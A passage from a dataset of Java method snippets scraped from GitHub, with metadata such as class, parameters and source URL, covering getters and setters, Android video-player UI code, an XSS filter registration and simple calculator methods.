getId()\n\t{\n\t\treturn id;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/model/Topic.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59507, "method_name": "setId", "class_name": "Topic", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setId( int id )\n\t{\n\t\tthis.id = id;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/model/Topic.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59508, "method_name": "getTitle", "class_name": "Topic", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getTitle()\n\t{\n\t\treturn title;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/model/Topic.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59509, "method_name": "setTitle", "class_name": "Topic", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTitle( String title )\n\t{\n\t\tthis.title = title;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/model/Topic.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59510, "method_name": "getLastPostTime", "class_name": "Topic", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getLastPostTime()\n\t{\n\t\treturn lastPostTime;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/model/Topic.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59511, "method_name": "setLastPostTime", "class_name": "Topic", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLastPostTime( Date lastPostTime )\n\t{\n\t\tthis.lastPostTime = lastPostTime;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/model/Topic.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59512, "method_name": "getLastPosterName", "class_name": "Topic", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getLastPosterName()\n\t{\n\t\treturn lastPosterName;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/model/Topic.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59513, "method_name": "setLastPosterName", "class_name": "Topic", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLastPosterName( String lastPosterName )\n\t{\n\t\tthis.lastPosterName = lastPosterName;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/model/Topic.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59514, "method_name": "getTorrents", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Torrents", "snippet": "    public Torrents getTorrents() {\n        return torrents;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59515, "method_name": "setTorrents", "class_name": "Episode", "params": ["Torrents"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTorrents(Torrents torrents) {\n        this.torrents = torrents;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59516, "method_name": "getWatched", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Watched", "snippet": "    public Watched getWatched() {\n        return watched;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59517, "method_name": "setWatched", "class_name": "Episode", "params": ["Watched"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWatched(Watched watched) {\n        this.watched = watched;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59518, "method_name": "getFirstAired", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getFirstAired() {\n        return firstAired;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59519, "method_name": "setFirstAired", "class_name": "Episode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFirstAired(int firstAired) {\n        this.firstAired = firstAired;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59520, "method_name": "isDateBased", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDateBased() {\n        return dateBased;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59521, "method_name": "setDateBased", "class_name": "Episode", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDateBased(boolean dateBased) {\n        this.dateBased = dateBased;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59522, "method_name": "getOverview", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOverview() {\n        return overview;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59523, "method_name": "setOverview", "class_name": "Episode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOverview(String overview) {\n        this.overview = overview;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59524, "method_name": "getTitle", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59525, "method_name": "setTitle", "class_name": "Episode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {\n        this.title = title;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59526, "method_name": "getEpisode", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getEpisode() {\n        return episode;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59527, "method_name": "setEpisode", "class_name": "Episode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEpisode(int episode) {\n        this.episode = episode;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59528, "method_name": "getSeason", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSeason() {\n        return season;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59529, "method_name": "setSeason", "class_name": "Episode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSeason(int season) {\n        this.season = season;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59530, "method_name": "getTvdbId", "class_name": "Episode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getTvdbId() {\n        return tvdbId;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59531, "method_name": "setTvdbId", "class_name": "Episode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTvdbId(int tvdbId) {\n        this.tvdbId = tvdbId;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/shows/Episode.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59532, "method_name": "getDimension", "class_name": "DimensionMismatchException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDimension() {\n        return dimension;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/apachemath/DimensionMismatchException.java", "stars": "74", "class_props": {"extends": "MathIllegalNumberException", "implements": null, "modifiers": ["public"]}}, {"id": 59533, "method_name": "init", "class_name": "SampleVideo", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init(Context context) {\n        super.init(context);\n        initView();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59534, "method_name": "initView", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initView() {\n        mMoreScale = (TextView) findViewById(R.id.moreScale);\n        mSwitchSize = (TextView) findViewById(R.id.switchSize);\n        mChangeRotate = (TextView) findViewById(R.id.change_rotate);\n        mChangeTransform = (TextView) findViewById(R.id.change_transform);\n\n        //\u5207\u6362\u6e05\u6670\u5ea6\n        mMoreScale.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if (mType == 0) {\n                    mType = 1;\n                } else if (mType == 1) {\n                    mType = 2;\n                } else if (mType == 2) {\n                    mType = 3;\n                } else if (mType == 3) {\n                    mType = 4;\n                } else if (mType == 4) {\n                    mType = 0;\n                }\n                resolveTypeUI();\n            }\n        });\n\n        //\u5207\u6362\u89c6\u9891\u6e05\u6670\u5ea6\n        mSwitchSize.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                showSwitchDialog();\n            }\n        });\n\n        //\u65cb\u8f6c\u64ad\u653e\u89d2\u5ea6\n        mChangeRotate.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if ((mTextureView.getRotation() - mRotate) == 270) {\n                    mTextureView.setRotation(mRotate);\n                    mTextureView.requestLayout();\n                } else {\n                    mTextureView.setRotation(mTextureView.getRotation() + 90);\n                    mTextureView.requestLayout();\n                }\n            }\n        });\n\n        //\u955c\u50cf\u65cb\u8f6c\n        mChangeTransform.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if (mTransformSize == 0) {\n                    mTransformSize = 1;\n                } else if (mTransformSize == 1) {\n                    mTransformSize = 2;\n                } else if (mTransformSize == 2) {\n                    mTransformSize = 0;\n                }\n                resolveTransform();\n            }\n        });\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59535, "method_name": "onSurfaceSizeChanged", "class_name": "SampleVideo", "params": ["Surface", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceSizeChanged(Surface surface, int width, int height) {\n        super.onSurfaceSizeChanged(surface, width, height);\n        resolveTransform();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59536, "method_name": "onSurfaceAvailable", "class_name": "SampleVideo", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceAvailable(Surface surface) {\n        super.onSurfaceAvailable(surface);\n        resolveRotateUI();\n        resolveTransform();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59537, "method_name": "resolveTransform", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resolveTransform() {\n        switch (mTransformSize) {\n            case 1: {\n                Matrix transform = new Matrix();\n                transform.setScale(-1, 1, mTextureView.getWidth() / 2, 0);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u5de6\u53f3\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n            case 2: {\n                Matrix transform = new Matrix();\n                transform.setScale(1, -1, 0, mTextureView.getHeight() / 2);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u4e0a\u4e0b\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n            case 0: {\n                Matrix transform = new Matrix();\n                transform.setScale(1, 1, mTextureView.getWidth() / 2, 0);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u65cb\u8f6c\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59538, "method_name": "setUp", "class_name": "SampleVideo", "params": ["List<SwitchVideoModel>", "boolean", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(List<SwitchVideoModel> url, boolean cacheWithPlay, String title) {\n        mUrlList = url;\n        return setUp(url.get(mSourcePosition).getUrl(), cacheWithPlay, title);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59539, "method_name": "setUp", "class_name": "SampleVideo", "params": ["List<SwitchVideoModel>", "boolean", "File", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(List<SwitchVideoModel> url, boolean cacheWithPlay, File cachePath, String title) {\n        mUrlList = url;\n        return setUp(url.get(mSourcePosition).getUrl(), cacheWithPlay, cachePath, title);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59540, "method_name": "getLayoutId", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId() {\n        return R.layout.sample_video;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59541, "method_name": "startWindowFullscreen", "class_name": "SampleVideo", "params": ["Context", "boolean", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYBaseVideoPlayer", "snippet": "    public GSYBaseVideoPlayer startWindowFullscreen(Context context, boolean actionBar, boolean statusBar) {\n        SampleVideo sampleVideo = (SampleVideo) super.startWindowFullscreen(context, actionBar, statusBar);\n        sampleVideo.mSourcePosition = mSourcePosition;\n        sampleVideo.mType = mType;\n        sampleVideo.mTransformSize = mTransformSize;\n        sampleVideo.mUrlList = mUrlList;\n        sampleVideo.mTypeText = mTypeText;\n        //sampleVideo.resolveTransform();\n        sampleVideo.resolveTypeUI();\n        //sampleVideo.resolveRotateUI();\n        //\u8fd9\u4e2a\u64ad\u653e\u5668\u7684demo\u914d\u7f6e\u5207\u6362\u5230\u5168\u5c4f\u64ad\u653e\u5668\n        //\u8fd9\u53ea\u662f\u5355\u7eaf\u7684\u4f5c\u4e3a\u5168\u5c4f\u64ad\u653e\u663e\u793a\uff0c\u5982\u679c\u9700\u8981\u505a\u5927\u5c0f\u5c4f\u5e55\u5207\u6362\uff0c\u8bf7\u8bb0\u5f97\u5728\u8fd9\u91cc\u8036\u8bbe\u7f6e\u4e0a\u89c6\u9891\u5168\u5c4f\u7684\u9700\u8981\u7684\u81ea\u5b9a\u4e49\u914d\u7f6e\n        //\u6bd4\u5982\u5df2\u65cb\u8f6c\u89d2\u5ea6\u4e4b\u7c7b\u7684\u7b49\u7b49\n        //\u53ef\u53c2\u8003super\u4e2d\u7684\u5b9e\u73b0\n        return sampleVideo;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59542, "method_name": "resolveNormalVideoShow", "class_name": "SampleVideo", "params": ["View", "ViewGroup", "GSYVideoPlayer"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resolveNormalVideoShow(View oldF, ViewGroup vp, GSYVideoPlayer gsyVideoPlayer) {\n        super.resolveNormalVideoShow(oldF, vp, gsyVideoPlayer);\n        if (gsyVideoPlayer != null) {\n            SampleVideo sampleVideo = (SampleVideo) gsyVideoPlayer;\n            mSourcePosition = sampleVideo.mSourcePosition;\n            mType = sampleVideo.mType;\n            mTransformSize = sampleVideo.mTransformSize;\n            mTypeText = sampleVideo.mTypeText;\n            setUp(mUrlList, mCache, mCachePath, mTitle);\n            resolveTypeUI();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59543, "method_name": "resolveRotateUI", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveRotateUI() {\n        if (!mHadPlay) {\n            return;\n        }\n        mTextureView.setRotation(mRotate);\n        mTextureView.requestLayout();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59544, "method_name": "resolveTypeUI", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveTypeUI() {\n        if (!mHadPlay) {\n            return;\n        }\n        if (mType == 1) {\n            mMoreScale.setText(\"16:9\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_16_9);\n        } else if (mType == 2) {\n            mMoreScale.setText(\"4:3\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_4_3);\n        } else if (mType == 3) {\n            mMoreScale.setText(\"\u5168\u5c4f\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_FULL);\n        } else if (mType == 4) {\n            mMoreScale.setText(\"\u62c9\u4f38\u5168\u5c4f\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_MATCH_FULL);\n        } else if (mType == 0) {\n            mMoreScale.setText(\"\u9ed8\u8ba4\u6bd4\u4f8b\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_DEFAULT);\n        }\n        changeTextureViewShowType();\n        if (mTextureView != null)\n            mTextureView.requestLayout();\n        mSwitchSize.setText(mTypeText);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59545, "method_name": "showSwitchDialog", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showSwitchDialog() {\n        if (!mHadPlay) {\n            return;\n        }\n        SwitchVideoTypeDialog switchVideoTypeDialog = new SwitchVideoTypeDialog(getContext());\n        switchVideoTypeDialog.initList(mUrlList, new SwitchVideoTypeDialog.OnListItemClickListener() {\n            @Override\n            public void onItemClick(int position) {\n                final String name = mUrlList.get(position).getName();\n                if (mSourcePosition != position) {\n                    if ((mCurrentState == GSYVideoPlayer.CURRENT_STATE_PLAYING\n                            || mCurrentState == GSYVideoPlayer.CURRENT_STATE_PAUSE)) {\n                        final String url = mUrlList.get(position).getUrl();\n                        onVideoPause();\n                        final long currentPosition = mCurrentPosition;\n                        getGSYVideoManager().releaseMediaPlayer();\n                        cancelProgressTimer();\n                        hideAllWidget();\n                        new Handler().postDelayed(new Runnable() {\n                            @Override\n                            public void run() {\n                                setUp(url, mCache, mCachePath, mTitle);\n                                setSeekOnStart(currentPosition);\n                                startPlayLogic();\n                                cancelProgressTimer();\n                                hideAllWidget();\n                            }\n                        }, 500);\n                        mTypeText = name;\n                        mSwitchSize.setText(name);\n                        mSourcePosition = position;\n                    }\n                } else {\n                    Toast.makeText(getContext(), \"\u5df2\u7ecf\u662f \" + name, Toast.LENGTH_LONG).show();\n                }\n            }\n        });\n        switchVideoTypeDialog.show();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59546, "method_name": "quack", "class_name": "MuteQuack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void quack() {\n        // A different kinda quack ie mute\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Strategy%20Pattern/src/Quack/MuteQuack.java", "stars": "38", "class_props": {"extends": null, "implements": ["IQuackBehaviour"], "modifiers": ["public"]}}, {"id": 59547, "method_name": "xssFilterRegistrationBean", "class_name": "XssFilterConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FilterRegistrationBean", "snippet": "    public FilterRegistrationBean xssFilterRegistrationBean() {\n        FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean();\n        filterRegistrationBean.setFilter(new XssFilter());\n        filterRegistrationBean.setOrder(Integer.MAX_VALUE - 1);\n        filterRegistrationBean.setEnabled(true);\n        filterRegistrationBean.addUrlPatterns(\"/*\");\n        Map<String, String> initParameters = new HashMap<>();\n        // excludes\u7528\u4e8e\u914d\u7f6e\u4e0d\u9700\u8981\u53c2\u6570\u8fc7\u6ee4\u7684\u8bf7\u6c42url\n        initParameters.put(\"excludes\", \"/favicon.ico,/img/*,/js/*,/css/*\");\n        // isIncludeRichText\u4e3b\u8981\u7528\u4e8e\u8bbe\u7f6e\u5bcc\u6587\u672c\u5185\u5bb9\u662f\u5426\u9700\u8981\u8fc7\u6ee4\n        initParameters.put(\"isIncludeRichText\", \"true\");\n        filterRegistrationBean.setInitParameters(initParameters);\n        return filterRegistrationBean;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/config/XssFilterConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59548, "method_name": "getFieldOrder", "class_name": "MachHeader", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "List<String>", "snippet": "    protected List<String> getFieldOrder() {\n        return Arrays.asList(\"magic\", \"cpuType\", \"cpuSubType\", \"fileType\", \"ncmds\", \"sizeOfCmds\", \"flags\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/MachHeader.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": null, "modifiers": ["public"]}}, {"id": 59549, "method_name": "setExecutable", "class_name": "MachHeader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setExecutable() {\n        if (fileType != MachO.FileType.EXECUTE.id()) {\n            backupFileType = fileType;\n            fileType = (int) MachO.FileType.EXECUTE.id();\n            this.pack();\n            return true;\n        } else {\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/MachHeader.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": null, "modifiers": ["public"]}}, {"id": 59550, "method_name": "resetFileType", "class_name": "MachHeader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void resetFileType() {\n        fileType = backupFileType;\n        this.pack();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/MachHeader.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": null, "modifiers": ["public"]}}, {"id": 59551, "method_name": "sum", "class_name": "Calculator", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int sum(int numOne, int numTwo) {\n\t\treturn numOne + numTwo;\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day9/Calculator.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59552, "method_name": "multiply", "class_name": "Calculator", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int multiply(int numOne, int numTwo) {\n\t\treturn numOne * numTwo;\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day9/Calculator.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59553, "method_name": "division", "class_name": "Calculator", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int division(int numOne, int numTwo) {\n\t\treturn numOne / numTwo;\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day9/Calculator.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59554, "method_name": "sum", "class_name": "Calculator", "params": ["double", "double"], "throws": null, "modifiers": ["public", "static"], "return_type": "double", "snippet": "\tpublic static double sum(double numOne, double numTwo) {\n\t\treturn numOne + numTwo;\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day9/Calculator.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59555, "method_name": "concat", "class_name": "Calculator", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String concat(String str, String str1) {\n\t\treturn str + str1;\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day9/Calculator.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59556, "method_name": "makeStr", "class_name": "Calculator", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String makeStr(String word) {\n\t\treturn \"<>\" + word + \"</>\";\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day9/Calculator.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59557, "method_name": "makeStr", "class_name": "Calculator", "params": ["String", 